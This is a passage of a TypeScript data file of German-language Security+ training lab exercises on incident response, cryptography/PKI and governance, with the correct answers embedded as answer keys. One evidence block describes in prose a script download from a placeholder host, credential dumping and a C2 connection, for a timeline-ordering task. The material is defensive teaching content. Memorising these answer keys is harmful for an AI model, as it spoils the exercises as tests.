      options: ['P1 — kritischer Incident', 'P2 — Account-Risiko untersuchen', 'P3 — beobachten/korrelieren', 'P4 — dokumentieren/kein Incident'],
    },
  },
  {
    id: 'ir-containment-strategy',
    categoryId: 'incident-response',
    title: 'Containment passend waehlen',
    objective: '4.8 Incident Response',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Nicht jedes Containment ist gleich. Ordne jedem Befund die Massnahme zu, die Ausbreitung stoppt und Beweise moeglichst erhaelt.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Aktive Ransomware-Verschluesselung auf Fileserver', right: 'Netzwerkisolierung, System nicht sofort ausschalten' },
        { left: 'Kompromittiertes SaaS-Admin-Konto', right: 'Session widerrufen, Passwort/MFA resetten, Token invalidieren' },
        { left: 'C2-Beacon von Client, keine Verschluesselung', right: 'EDR-Isolation + volatile Daten sichern' },
        { left: 'Malware-Domain im DNS sichtbar', right: 'DNS/Sinkhole-Block + Suche nach weiteren Hosts' },
      ],
      options: [
        'Netzwerkisolierung, System nicht sofort ausschalten',
        'Session widerrufen, Passwort/MFA resetten, Token invalidieren',
        'EDR-Isolation + volatile Daten sichern',
        'DNS/Sinkhole-Block + Suche nach weiteren Hosts',
      ],
    },
  },
  {
    id: 'ir-forensic-volatility',
    categoryId: 'incident-response',
    title: 'Forensik: fluechtig vor stabil',
    objective: '4.9 Security Data Sources',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Ein kompromittierter Server ist noch eingeschaltet. Bring die Beweissicherung nach Volatilitaet in eine sinnvolle Reihenfolge.',
    evidence:
      'Server APP-17: noch online, C2-Verbindung aktiv, Disk-Verschluesselung nicht aktiv.\n  Vorgabe: Beweismittel priorisieren; Produktivbetrieb ist bereits auf Ersatzsystem umgeschwenkt.',
    interaction: {
      type: 'ordering',
      steps: [
        // Order of Volatility (RFC 3227): RAM vor Disk, Disk vor Remote-Logs;
        // Hashing erst nach der LETZTEN Sicherung, damit die Reihenfolge eindeutig ist.
        'Disk-Image im Write-Blocker-/forensischen Verfahren erstellen',
        'RAM-Abbild und laufende Prozesse/Netzwerkverbindungen sichern',
        'Zentrale SIEM-/EDR-Logs exportieren und gegen Loeschung sichern',
        'Hashwerte aller gesicherten Images und Exporte berechnen und dokumentieren',
        'Arbeitskopie fuer Analyse erstellen, Original versiegeln',
      ],
      correctOrder: [1, 0, 2, 3, 4],
    },
  },
  {
    id: 'ir-communications-plan',
    categoryId: 'incident-response',
    title: 'Kommunikation im Incident',
    objective: '4.8 Incident Response',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Ein Incident wird oeffentlich relevant. Ordne jede Nachricht dem richtigen Kommunikationskanal bzw. Rolleninhaber zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Technische IOCs an betroffene Admin-Teams', right: 'Interner IR-Kanal / Technik-Bridge' },
        { left: 'Kundenhinweis nach Freigabe', right: 'Kommunikation/PR mit Legal-Abstimmung' },
        { left: 'Moegliche Meldepflicht pruefen', right: 'Legal/Compliance' },
        { left: 'Executive-Lagebild: Risiko, Auswirkung, naechste Entscheidung', right: 'Incident Commander an Management' },
      ],
      options: [
        'Interner IR-Kanal / Technik-Bridge',
        'Kommunikation/PR mit Legal-Abstimmung',
        'Legal/Compliance',
        'Incident Commander an Management',
      ],
    },
  },
  {
    id: 'ir-edr-timeline',
    categoryId: 'incident-response',
    title: 'EDR-Timeline rekonstruieren',
    objective: '4.9 Security Data Sources',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Die EDR-Timeline ist unsortiert. Bring die Ereignisse in die wahrscheinlich korrekte Angriffssequenz.',
    evidence:
      'Host FIN-07:\n  - powershell.exe laedt Script von paste.example\n  - winword.exe startet child process cmd.exe\n  - rundll32.exe baut Verbindung zu 203.0.113.77:443 auf\n  - archive.zip wird im Temp-Verzeichnis erzeugt\n  - powershell.exe fuehrt Invoke-Mimikatz-aehnliches Pattern aus',
    interaction: {
      type: 'ordering',
      steps: [
        'archive.zip wird im Temp-Verzeichnis erzeugt',
        'winword.exe startet child process cmd.exe',
        'rundll32.exe baut Verbindung zu 203.0.113.77:443 auf',
        'powershell.exe fuehrt Credential-Dump-Pattern aus',
        'powershell.exe laedt Script von paste.example',
      ],
      correctOrder: [1, 4, 3, 0, 2],
    },
  },
  {
    id: 'ir-recovery-validation',
    categoryId: 'incident-response',
    title: 'Recovery validieren',
    objective: '4.8 Incident Response',
    difficulty: 'fortgeschritten',
    minutes: 5,
    description:
      'Nach Ransomware ist der Restore technisch fertig. Bring die Validierungsschritte vor der Freigabe in eine sichere Reihenfolge.',
    evidence:
      'Restore-Ziel: ERP-DB und Appserver aus Offline-Backup\n  Vorgabe: keine Reinfektion, Datenintegritaet und Business-Freigabe nachweisen.',
    interaction: {
      type: 'ordering',
      steps: [
        'Business-Stichproben und Transaktionsintegritaet validieren',
        'Monitoring erhoehen und kontrolliert wieder ans Netz nehmen',
        'Restore in isolierter Umgebung durchfuehren',
        'Backup vor Restore auf Malware/Integritaet pruefen',
        'Systeme patchen und kompromittierte Credentials rotieren',
      ],
      correctOrder: [3, 2, 4, 0, 1],
    },
  },
  {
    id: 'ir-phishing-report-flow',
    categoryId: 'incident-response',
    title: 'Phishing-Meldung bearbeiten',
    objective: '4.8 Incident Response',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Ein Mitarbeiter meldet eine verdachtige Mail. Ordne die SOC-Schritte von der Meldung bis zur Praevention.',
    interaction: {
      type: 'ordering',
      steps: [
        'Mail-Header, URLs und Anhange in isolierter Analyseumgebung pruefen',
        'Aehnliche Mails in Mailboxen suchen und entfernen',
        'Meldung erfassen und User bestaetigen, dass nicht geklickt werden soll',
        'IOCs an Mail-Gateway/DNS/EDR verteilen',
        'Awareness-Feedback mit konkreten Erkennungsmerkmalen geben',
      ],
      correctOrder: [2, 0, 1, 3, 4],
    },
  },
  {
    id: 'ir-lessons-learned-actions',
    categoryId: 'incident-response',
    title: 'Lessons Learned in Massnahmen uebersetzen',
    objective: '4.8 Incident Response',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Nach dem Incident-Retrospektivtermin liegen Findings vor. Ordne jedes Finding der konkreten Verbesserungsmassnahme zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Incident Commander war nicht eindeutig benannt', right: 'IR-Rollen/RACI aktualisieren und ueben' },
        { left: 'Logs reichten nur 3 Tage zurueck', right: 'Retention und zentrale Log-Sicherung erhoehen' },
        { left: 'Backup-Restore dauerte laenger als RTO', right: 'Restore-Runbook und Tests anpassen' },
        { left: 'Helpdesk resetete MFA ohne Identitaetspruefung', right: 'Helpdesk-Verifikation und Schulung haerten' },
      ],
      options: [
        'IR-Rollen/RACI aktualisieren und ueben',
        'Retention und zentrale Log-Sicherung erhoehen',
        'Restore-Runbook und Tests anpassen',
        'Helpdesk-Verifikation und Schulung haerten',
      ],
    },
  },

  {
    id: 'ir-uebungsformate',
    categoryId: 'incident-response',
    title: 'IR-Uebung: das richtige Format',
    objective: '4.8 Incident Response',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Der IR-Plan ist neu — jetzt soll er geuebt werden. Ordne jedem Ziel das passende Uebungsformat zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Plan gemeinsam durchsprechen, ohne Systeme anzufassen', right: 'Tabletop-Exercise' },
        { left: 'Failover ins Backup-RZ technisch wirklich durchfuehren', right: 'Failover-/Functional-Test' },
        { left: 'Realistischer Angriff durch ein beauftragtes Red Team', right: 'Red-Team-Engagement / Simulation' },
        { left: 'Einzelne Rolle uebt ihre Meldewege am Leitfaden', right: 'Walkthrough / Drill' },
      ],
      options: ['Tabletop-Exercise', 'Failover-/Functional-Test', 'Red-Team-Engagement / Simulation', 'Walkthrough / Drill'],
    },
  },
  {
    id: 'ir-threat-hunt-hypothese',
    categoryId: 'incident-response',
    title: 'Threat Hunt: von Hypothese zu Befund',
    objective: '4.8 Incident Response',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Threat Intel meldet eine Kampagne mit DLL-Sideloading. Bring den hypothesenbasierten Hunt in die richtige Reihenfolge — vom Intel-Report bis zur wiederholbaren Detection-Regel.',
    evidence:
      'Intel-Report TI-2026-114:\n  Kampagne nutzt signierten Updater + boesartige DLL im selben Ordner\n  Persistenz: Scheduled Task "OneDriveUpd"\n  C2: HTTPS zu wechselnden CDN-Domains, TLS-Fingerprint bekannt',
    interaction: {
      type: 'ordering',
      steps: [
        'Treffer validieren: Prozessbaum und Task "OneDriveUpd" auf den Hosts pruefen',
        'Hypothese formulieren: signierter Prozess laedt DLL aus dem Nutzerverzeichnis',
        'Bestaetigte Kompromittierung als Incident an die IR uebergeben',
        'Telemetrie abfragen: Module-Loads und TLS-Fingerprints der letzten 30 Tage im EDR/Netz',
        'Hunt dokumentieren und als wiederholbare Detection-Regel hinterlegen',
      ],
      correctOrder: [1, 3, 0, 2, 4],
    },
  },

  // ── Kryptografie & PKI (⚠️ neu generiert) ─────────────────────────────────
  {
    id: 'krypto-bausteine',
    categoryId: 'krypto',
    title: 'Krypto-Baustein zum Schutzziel',
    objective: '1.4 Cryptographic Solutions',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Ordne jedem Schutzziel den passenden kryptografischen Baustein zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Vertraulichkeit grosser Datenmengen', right: 'Symmetrische Verschluesselung (AES)' },
        { left: 'Schluesselaustausch ohne gemeinsames Geheimnis', right: 'Asymmetrische Verfahren (ECDH/RSA)' },
        { left: 'Integritaet einer Datei pruefen', right: 'Hash (SHA-256)' },
        { left: 'Authentizitaet + Nichtabstreitbarkeit', right: 'Digitale Signatur' },
      ],
      options: [
        'Symmetrische Verschluesselung (AES)',
        'Asymmetrische Verfahren (ECDH/RSA)',
        'Hash (SHA-256)',
        'Digitale Signatur',
      ],
    },
  },
  {
    id: 'krypto-cert-lifecycle',
    categoryId: 'krypto',
    title: 'Zertifikats-Lebenszyklus ordnen',
    objective: '1.4 Cryptographic Solutions',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Ein neues TLS-Zertifikat fuer den Webshop. Bring die Schritte von der Erzeugung bis zum Widerruf in die richtige Reihenfolge.',
    interaction: {
      type: 'ordering',
      steps: [
        'CSR (Certificate Signing Request) erzeugen',
        'Schluesselpaar generieren (privater Key bleibt lokal)',
        'CA validiert die Domain und stellt das Zertifikat aus',
        'Zertifikat installieren und Kette pruefen',
        'Bei Key-Kompromittierung: Revocation via CRL/OCSP',
      ],
      correctOrder: [1, 0, 2, 3, 4],
    },
  },
  {
    id: 'krypto-tls-fehler',
    categoryId: 'krypto',
    title: 'TLS-Warnung richtig deuten',
    objective: '1.4 Cryptographic Solutions',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Vier Browser-Warnungen aus dem Support-Postfach. Ordne jeder Warnung die wahrscheinlichste Ursache zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: '"Zertifikat abgelaufen"', right: 'Renewal verpasst' },
        { left: '"Name stimmt nicht ueberein"', right: 'CN/SAN passt nicht zur Domain' },
        { left: '"Aussteller unbekannt"', right: 'CA-Kette/Root fehlt im Truststore' },
        { left: '"Zertifikat widerrufen"', right: 'Key kompromittiert, Revocation aktiv' },
      ],
      options: [
        'Renewal verpasst',
        'CN/SAN passt nicht zur Domain',
        'CA-Kette/Root fehlt im Truststore',
        'Key kompromittiert, Revocation aktiv',
      ],
    },
  },
  {
    id: 'krypto-hash-einsatz',
    categoryId: 'krypto',
    title: 'Hashing: richtiger Einsatzort',
    objective: '1.4 Cryptographic Solutions',
    difficulty: 'einsteiger',
    minutes: 3,
    description:
      'Ordne jedem Einsatzzweck das passende Verfahren zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Passwoerter speichern', right: 'Salted Hash (bcrypt/argon2)' },
        { left: 'Download-Integritaet pruefen', right: 'SHA-256-Checksumme' },
        { left: 'Nachricht authentifizieren (gemeinsamer Key)', right: 'HMAC' },
      ],
      options: ['Salted Hash (bcrypt/argon2)', 'SHA-256-Checksumme', 'HMAC'],
    },
  },
  {
    id: 'krypto-key-lifecycle',
    categoryId: 'krypto',
    title: 'Key-Lifecycle im KMS',
    objective: '1.4 Cryptographic Solutions',
    difficulty: 'fortgeschritten',
    minutes: 5,
    description:
      'Ein zentraler KMS-Prozess wird auditiert. Bring die Schritte des Schluessel-Lebenszyklus in eine nachvollziehbare Reihenfolge.',
    evidence:
      'Scope: Kundendatenbank mit AES-256-at-rest\n  Vorgabe: Schluesselmaterial zentral erzeugen, Zugriff trennen, Rotation und Retirement dokumentieren.',
    interaction: {
      type: 'ordering',
      steps: [
        'Key-Rotation nach Policy oder bei Risikoereignis durchfuehren',
        'Schluessel mit definiertem Algorithmus/Laenge im KMS erzeugen',
        'Key am Ende der Aufbewahrungsfrist sicher deaktivieren/zerstoeren',
        'Schluessel fuer autorisierte Anwendung freigeben und Nutzung protokollieren',
        'Alten Key fuer Entschluesselung archivieren, neue Verschluesselung mit neuem Key',
      ],
      correctOrder: [1, 3, 0, 4, 2],
    },
  },
  {
    id: 'krypto-aead-hmac-signatur',
    categoryId: 'krypto',
    title: 'AEAD, HMAC oder Signatur?',
    objective: '1.4 Cryptographic Solutions',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Vier Designs brauchen kryptografische Integritaet oder Authentizitaet. Ordne den passenden Baustein zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'API-Webhook mit gemeinsamem Secret pruefen', right: 'HMAC' },
        { left: 'Firmware-Update vom Hersteller verifizieren', right: 'Digitale Signatur / Code Signing' },
        { left: 'Daten gleichzeitig verschluesseln und authentisieren', right: 'AEAD (z. B. AES-GCM)' },
        { left: 'Passwort nicht reversibel speichern', right: 'Salted Password Hashing' },
      ],
      options: ['HMAC', 'Digitale Signatur / Code Signing', 'AEAD (z. B. AES-GCM)', 'Salted Password Hashing'],
    },
  },
  {
    id: 'krypto-pki-chain',
    categoryId: 'krypto',
    title: 'PKI-Vertrauenskette pruefen',
    objective: '1.4 Cryptographic Solutions',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Ein Browser meldet eine TLS-Kettenwarnung. Bring die Pruefschritte in die richtige Reihenfolge, um die Ursache sauber einzugrenzen.',
    evidence:
      'Fehler: NET::ERR_CERT_AUTHORITY_INVALID\n  Server liefert Leaf-Zertifikat, aber Nutzer berichten nur bei neuen Laptops ueber Fehler.',
    interaction: {
      type: 'ordering',
      steps: [
        'Root-CA-Vertrauen im Client-Truststore pruefen',
        'Server-Konfiguration korrigieren oder fehlendes Root/Intermediate verteilen',
        'Leaf-Zertifikat auf Subject/SAN, Gueltigkeit und Key Usage pruefen',
        'Revocation-Status via OCSP/CRL pruefen',
        'Gelieferte Intermediate-Zertifikate und Chain-Reihenfolge pruefen',
      ],
      correctOrder: [2, 4, 0, 3, 1],
    },
  },
  {
    id: 'krypto-secret-storage',
    categoryId: 'krypto',
    title: 'Secret Storage statt Klartext',
    objective: '1.4 Cryptographic Solutions',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Vier Fundorte enthalten Geheimnisse. Ordne jeden Fund der passenden sicheren Ablage bzw. Massnahme zu.',
    evidence:
      'Review:\n  A. DB-Passwort in Git-Historie\n  B. API-Key als Kubernetes-Env-Var\n  C. TLS private key auf gemeinsamem Fileshare\n  D. Laptop-Backup enthaelt unverschluesselte Token-Datei',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: Passwort in Git-Historie', right: 'Secret rotieren + Historie/Repo bereinigen' },
        { left: 'B: API-Key als Env-Var', right: 'Secret Manager mit kurzlebigen Credentials' },
        { left: 'C: TLS-Key auf Fileshare', right: 'HSM/KMS oder geschuetzter Key Store' },
        { left: 'D: Token im Laptop-Backup', right: 'Backup-Verschluesselung + Token-Revocation' },
      ],
      options: [
        'Secret rotieren + Historie/Repo bereinigen',
        'Secret Manager mit kurzlebigen Credentials',
        'HSM/KMS oder geschuetzter Key Store',
        'Backup-Verschluesselung + Token-Revocation',
      ],
    },
  },

  {
    id: 'krypto-obfuskation',
    categoryId: 'krypto',
    title: 'Tokenisierung, Maskierung & Co.',
    objective: '3.3 Data Protection',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Kreditkartendaten tauchen an zu vielen Stellen auf. Ordne jeder Anforderung die passende Verschleierungs-Technik zu.',
    evidence:
      'Anforderungen:\n  A. Bezahlsystem speichert statt der PAN einen wertlosen Ersatzwert; Rueckweg nur ueber den Vault\n  B. Support-Mitarbeiter sehen nur die letzten 4 Ziffern\n  C. Testumgebung braucht realistisch aussehende, aber dauerhaft veraenderte Daten\n  D. Vertrauliche Datei soll unauffaellig in einem Bild transportiert werden',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: Ersatzwert + Vault statt PAN', right: 'Tokenisierung' },
        { left: 'B: nur letzte 4 Ziffern sichtbar', right: 'Maskierung' },
        { left: 'C: dauerhaft veraenderte Testdaten', right: 'Anonymisierung/Pseudonymisierung' },
        { left: 'D: Datei im Bild verstecken', right: 'Steganografie' },
      ],
      options: ['Tokenisierung', 'Maskierung', 'Anonymisierung/Pseudonymisierung', 'Steganografie'],
    },
  },
  {
    id: 'krypto-zertifikatstypen',
    categoryId: 'krypto',
    title: 'Den richtigen Zertifikatstyp waehlen',
    objective: '1.4 Cryptographic Solutions',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Vier Zertifikats-Anfragen liegen im PKI-Ticket. Ordne jeder Anfrage den passenden Zertifikatstyp zu.',
    evidence:
      'Ticket PKI-883:\n  A. shop.example.de, www.example.de und api.example.de in EINEM Zertifikat\n  B. Alle kuenftigen Subdomains unter *.dev.example.de abdecken\n  C. Interner Testserver, kein externes Vertrauen noetig, schnell und kostenlos\n  D. Code des neuen Windows-Agents soll vom OS als vertrauenswuerdig gelten',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: drei feste Hostnamen, ein Zertifikat', right: 'SAN-/Multi-Domain-Zertifikat' },
        { left: 'B: beliebige Subdomains einer Ebene', right: 'Wildcard-Zertifikat' },
        { left: 'C: nur intern, ohne externe CA', right: 'Self-Signed / interne CA' },
        { left: 'D: Software-Integritaet bei der Installation', right: 'Code-Signing-Zertifikat' },
      ],
      options: ['SAN-/Multi-Domain-Zertifikat', 'Wildcard-Zertifikat', 'Self-Signed / interne CA', 'Code-Signing-Zertifikat'],
    },
  },

  // ── Governance & Risiko (⚠️ neu generiert) ────────────────────────────────
  {
    id: 'governance-risk-response',
    categoryId: 'governance',
    title: 'Risk Response: was passiert hier?',
    objective: '5.2 Risk Management',
    difficulty: 'einsteiger',
    minutes: 3,
    description:
      'Vier Management-Entscheidungen zu Risiken. Ordne jeder Entscheidung die Risk-Response-Strategie zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Cyber-Versicherung gegen Ransomware abschliessen', right: 'Transfer' },
        { left: 'Alte FTP-Schnittstelle wird abgeschaltet', right: 'Avoid' },
        { left: 'WAF vor die Anwendung schalten', right: 'Mitigate' },
        { left: 'Restrisiko dokumentiert und vom CISO gegengezeichnet', right: 'Accept' },
      ],
      options: ['Transfer', 'Avoid', 'Mitigate', 'Accept'],
    },
  },
  {
    id: 'governance-datenrollen',
    categoryId: 'governance',
    title: 'Datenrollen im Unternehmen',
    objective: '5.4 Data Governance',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Ordne jeder Aufgabenbeschreibung die richtige Datenrolle zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Traegt die Gesamtverantwortung fuer den Datensatz', right: 'Data Owner' },
        { left: 'Betreibt Speicherung, Backup und Zugriffstechnik', right: 'Data Custodian' },
        { left: 'Ueberwacht Qualitaet und Einhaltung der Regeln', right: 'Data Steward' },
        { left: 'Verarbeitet Daten im Auftrag des Verantwortlichen', right: 'Data Processor' },
      ],
      options: ['Data Owner', 'Data Custodian', 'Data Steward', 'Data Processor'],
    },
  },
  {
    id: 'governance-policy-typen',
    categoryId: 'governance',
    title: 'Policy, Standard, Procedure oder Guideline?',
    objective: '5.1 Security Program',
    difficulty: 'einsteiger',
    minutes: 3,
    description:
      'Vier Dokumente aus dem ISMS. Ordne jedes Dokument dem richtigen Dokumenttyp zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: '"Alle Mitarbeiter muessen Daten klassifizieren" (Was/Warum)', right: 'Policy' },
        { left: '"Verschluesselung erfolgt mit AES-256" (verbindliches Wie)', right: 'Standard' },
        { left: 'Schritt-fuer-Schritt-Anleitung zum Datei-Verschluesseln', right: 'Procedure' },
        { left: 'Empfehlung fuer sichere Passphrasen (optional)', right: 'Guideline' },
      ],
      options: ['Policy', 'Standard', 'Procedure', 'Guideline'],
    },
  },
  {
    id: 'governance-audit-ablauf',
    categoryId: 'governance',
    title: 'Internes Audit sauber durchziehen',
    objective: '5.5 Audits & Assessments',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Das interne Security-Audit steht an. Bring die Schritte in die richtige Reihenfolge.',
    interaction: {
      type: 'ordering',
      steps: [
        'Findings bewerten und priorisieren',
        'Scope und Audit-Kriterien festlegen',
        'Follow-up: Umsetzung der Massnahmen pruefen',
        'Nachweise sammeln (Interviews, Konfigs, Logs)',
        'Bericht mit Massnahmenplan an das Management',
      ],
      correctOrder: [1, 3, 0, 4, 2],
    },
  },
  {
    id: 'governance-third-party-risk',
    categoryId: 'governance',
    title: 'Third-Party-Risk priorisieren',
    objective: '5.3 Third-party Risk',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Vier Lieferanten sollen neu bewertet werden. Ordne jeden Befund der passenden Third-Party-Risk-Aktion zu.',
    evidence:
      'Vendor-Review:\n  A. SaaS verarbeitet Kundendaten, kein SOC-2/ISO-Nachweis aktuell\n  B. Kritischer Dienst laeuft ohne Exit-Plan\n  C. Open-Source-Komponente ohne SBOM/Versionsliste\n  D. Anbieter meldet Subprocessor-Wechsel in neues Land',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: kein aktueller Kontrollnachweis', right: 'Due-Diligence-Nachweis nachfordern / Risiko akzeptieren lassen' },
        { left: 'B: kein Exit-Plan fuer kritischen Dienst', right: 'Business-Continuity-/Exit-Plan verlangen' },
        { left: 'C: keine SBOM/Versionsliste', right: 'Software-Supply-Chain-Transparenz einfordern' },
        { left: 'D: Subprocessor-Wechsel', right: 'Datenschutz-/Compliance-Review ausloesen' },
      ],
      options: [
        'Due-Diligence-Nachweis nachfordern / Risiko akzeptieren lassen',
        'Business-Continuity-/Exit-Plan verlangen',
        'Software-Supply-Chain-Transparenz einfordern',
        'Datenschutz-/Compliance-Review ausloesen',
      ],
    },
  },
  {
    id: 'governance-awareness-plan',
    categoryId: 'governance',
    title: 'Awareness passend einsetzen',
    objective: '5.6 Security Awareness',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Vier Zielgruppen brauchen unterschiedliche Awareness-Massnahmen. Ordne die Massnahme der passenden Gruppe zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Helpdesk setzt MFA bei Anrufen zurueck', right: 'Rollenspiel zu Identitaetspruefung und Social Engineering' },
        { left: 'Entwickler committen Secrets', right: 'Secure-Coding-/Secret-Handling-Training' },
        { left: 'Finanzteam erhaelt CEO-Zahlungsanweisungen', right: 'BEC-/Invoice-Fraud-Training' },
        { left: 'Alle Mitarbeitenden klicken auf Paket-SMS', right: 'Phishing/Smishing-Microtraining' },
      ],
      options: [
        'Rollenspiel zu Identitaetspruefung und Social Engineering',
        'Secure-Coding-/Secret-Handling-Training',
        'BEC-/Invoice-Fraud-Training',
        'Phishing/Smishing-Microtraining',
      ],
    },
  },
  {
    id: 'governance-audit-evidence',
    categoryId: 'governance',
    title: 'Audit-Nachweise zuordnen',
    objective: '5.5 Audits and Assessments',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Ein Auditor fragt nach Nachweisen. Ordne jede Kontrollfrage dem besten Evidence-Typ zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Sind Adminrechte quartalsweise geprueft?', right: 'Access-Review-Protokoll mit Genehmigungen' },
        { left: 'Werden Backups wiederherstellbar getestet?', right: 'Restore-Testbericht mit Ergebnis und Datum' },
        { left: 'Sind Firewall-Aenderungen genehmigt?', right: 'Change-Tickets mit CAB-/Owner-Freigabe' },
        { left: 'Wurden kritische Schwachstellen fristgerecht behoben?', right: 'Vulnerability-Report mit SLA-Status' },
      ],
      options: [
        'Access-Review-Protokoll mit Genehmigungen',
        'Restore-Testbericht mit Ergebnis und Datum',
        'Change-Tickets mit CAB-/Owner-Freigabe',
        'Vulnerability-Report mit SLA-Status',
      ],
    },
  },
  {
    id: 'governance-quantitatives-risiko',
    categoryId: 'governance',
    title: 'SLE, ARO und ALE berechnen',
    objective: '5.2 Risk Management',
    difficulty: 'experte',
    minutes: 5,
    description:
      'Fuer den Risiko-Report sollst du den erwarteten Jahresschaden eines Ransomware-Szenarios beziffern. Ordne jeder Groesse den richtigen Wert aus dem Szenario zu.',
    evidence:
      'Szenario "Ransomware Werk 1":\n  Asset Value (AV): 500.000 EUR\n  Exposure Factor (EF): 40 % des Asset-Werts pro Vorfall\n  Eintrittswahrscheinlichkeit: statistisch 1 Vorfall alle 4 Jahre\n  Angebot Cyber-Versicherung: 30.000 EUR Praemie pro Jahr',
    goal: 'Ziel: SLE = AV x EF; ALE = SLE x ARO; dann gegen die Versicherungspraemie stellen.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'SLE (Schaden pro Vorfall)', right: '200.000 EUR' },
        { left: 'ARO (Vorfaelle pro Jahr)', right: '0,25' },
        { left: 'ALE (erwarteter Jahresschaden)', right: '50.000 EUR' },
        { left: 'Versicherung fuer 30.000 EUR/Jahr', right: 'Transfer lohnt sich: Praemie unter ALE' },
      ],
      options: ['200.000 EUR', '0,25', '50.000 EUR', 'Transfer lohnt sich: Praemie unter ALE', '125.000 EUR'],
    },
  },
  {
    id: 'governance-vertragsdokumente',
    categoryId: 'governance',
    title: 'SLA, MOU, MSA oder NDA?',
    objective: '5.3 Third-party Risk',
    difficulty: 'einsteiger',
    minutes: 3,
    description:
      'Vier Situationen aus dem Lieferanten-Onboarding. Ordne jeder Situation das passende Vertragsdokument zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: '99,9 % Verfuegbarkeit und 4h-Reaktionszeit zusichern', right: 'SLA' },
        { left: 'Rahmenbedingungen fuer kuenftige Einzelauftraege festlegen', right: 'MSA' },
        { left: 'Vertraulichkeit vor dem ersten Architektur-Workshop', right: 'NDA' },
        { left: 'Unverbindliche Absichtserklaerung zweier Organisationen', right: 'MOU' },
      ],
      options: ['SLA', 'MSA', 'NDA', 'MOU', 'BPA'],
    },
  },
  {
    id: 'governance-datenschutz-rollen',
    categoryId: 'governance',
    title: 'DSGVO: Rollen und Pflichten',
    objective: '5.4 Security Compliance',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Ein Kunde uebt sein Auskunftsrecht aus, parallel meldet der Cloud-Anbieter ein Datenleck. Ordne jede Pflicht der richtigen Rolle bzw. Frist zu.',
    evidence:
      'Sachverhalt:\n  - Der Webshop (dein Unternehmen) entscheidet ueber Zweck und Mittel der Datenverarbeitung\n  - Der Cloud-Anbieter hostet die Daten nur im Auftrag\n  - Das Datenleck betrifft Kundendaten; Aufsichtsbehoerde und Betroffene fragen nach',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Entscheidet ueber Zweck und Mittel der Verarbeitung', right: 'Controller (Verantwortlicher)' },
        { left: 'Verarbeitet nur im Auftrag und nach Weisung', right: 'Processor (Auftragsverarbeiter)' },
        { left: 'Meldung der Datenpanne an die Aufsichtsbehoerde', right: 'Binnen 72 Stunden durch den Controller' },
        { left: 'Beraet und ueberwacht intern die Einhaltung', right: 'Data Protection Officer (DPO)' },
      ],
      options: [
        'Controller (Verantwortlicher)',
        'Processor (Auftragsverarbeiter)',
        'Binnen 72 Stunden durch den Controller',
        'Data Protection Officer (DPO)',
      ],
    },
  },
]

/**
 * Ziel-Inventar: 100 Szenarien — Ausbau vom belegten 71er-Handy-Stand
 * (Pill "4 / 71") auf volle SY0-701-Objective-Abdeckung; siehe docs/labs.md.
 */
export const LAB_TARGET_INVENTORY = 100

const SY0_701 = 'comptia-sy0-701-objectives'

export const LAB_SCENARIO_SOURCE_REFS: Record<string, string[]> = {
  'grundlagen-control-funktion': [SY0_701, 'nist-csf-2'],
  'grundlagen-control-kategorie': [SY0_701, 'nist-csf-2'],
  'grundlagen-schutzziel': [SY0_701, 'nist-csf-2'],
  'grundlagen-zero-trust': [SY0_701, 'nist-sp-800-207', 'cisa-zero-trust-maturity-model'],
  'grundlagen-standard-change': [SY0_701, 'nist-csf-2'],
  'grundlagen-cab-freigabe': [SY0_701, 'nist-csf-2'],
  'grundlagen-capability': [SY0_701, 'nist-sp-800-207', 'cisa-zero-trust-maturity-model'],
  'grundlagen-shared-responsibility': [SY0_701, 'aws-shared-responsibility'],
  'grundlagen-deception-tech': [SY0_701, 'mitre-engage'],

  'bedrohungen-threat-actors': [SY0_701, 'mitre-attack-enterprise'],
  'bedrohungen-social-engineering': [SY0_701, 'cisa-phishing-social-engineering', 'mitre-attack-enterprise'],
  'bedrohungen-malware': [SY0_701, 'mitre-attack-enterprise', 'cisa-stopransomware-guide'],
  'bedrohungen-phishing-kette': [SY0_701, 'cisa-phishing-social-engineering', 'mitre-attack-enterprise', 'nist-sp-800-61r2'],
  'bedrohungen-vuln-typen': [SY0_701, 'owasp-top10-2021'],
  'bedrohungen-indikatoren': [SY0_701, 'mitre-attack-enterprise'],
